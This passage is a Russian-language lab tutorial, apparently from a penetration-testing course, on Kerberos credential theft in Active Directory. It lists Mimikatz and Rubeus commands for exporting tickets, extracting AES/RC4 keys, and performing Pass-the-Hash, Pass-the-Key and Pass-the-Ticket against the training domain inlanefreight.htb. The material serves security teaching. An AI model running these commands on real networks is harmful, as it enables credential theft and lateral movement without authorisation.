
#### Mimikatz - экспорт билетов

```cmd-session
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
```

Билеты, которые заканчиваются на `$`соответствуют учетной записи компьютера, которому требуется билет для взаимодействия с Active Directory. Билеты пользователя содержат имя пользователя, за которым следует `@`который разделяет имя службы и домен, например: `[randomvalue]-username@service-domain.local.kirbi`.

**Примечание.** Если вы выбираете билет с сервисом krbtgt, он соответствует TGT этой учетной записи.

#### Rubeus - экспорт билетов
```cmd-session
c:\tools> Rubeus.exe dump /nowrap
```

#### Mimikatz — извлечение ключей Kerberos

```cmd-session
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
```

Теперь, когда у нас есть доступ к `AES256_HMAC`и `RC4_HMAC`ключей, мы можем выполнить атаку OverPass the Hash или Pass the Key, используя `Mimikatz`и `Rubeus`.

#### Mimikatz - передать ключ или передать хэш
```cmd-session
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
Это создаст новый `cmd.exe`окно, которое мы можем использовать для запроса доступа к любой службе, которую мы хотим, в контексте целевого пользователя.

Чтобы подделать билет, используя `Rubeus`, мы можем использовать модуль `asktgt`с именем пользователя, доменом и хешем, которые могут быть `/rc4`, `/aes128`, `/aes256`, или `/des`. В следующем примере мы используем хэш aes256 из информации, которую мы собираем с помощью Mimikatz. `sekurlsa::ekeys`.

#### Rubeus — передать ключ или передать хэш
```cmd-session
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
## Пройти билет (PtT)

Теперь, когда у нас есть несколько билетов Kerberos, мы можем использовать их для бокового перемещения в среде.

С `Rubeus`мы выполнили атаку OverPass the Hash и получили билет в формате base64. Вместо этого мы могли бы использовать флаг `/ptt`для отправки билета (TGT или TGS) в текущий сеанс входа в систему.

#### Рубеус передай билет 
```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Обратите внимание, что теперь он отображает `Ticket successfully imported!`.

Другой способ — импортировать тикет в текущую сессию с помощью `.kirbi`файл с диска.

Давайте воспользуемся билетом, экспортированным из Mimikatz, и импортируем его с помощью Pass the Ticket.

#### Рубеус - Пройди билет
```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```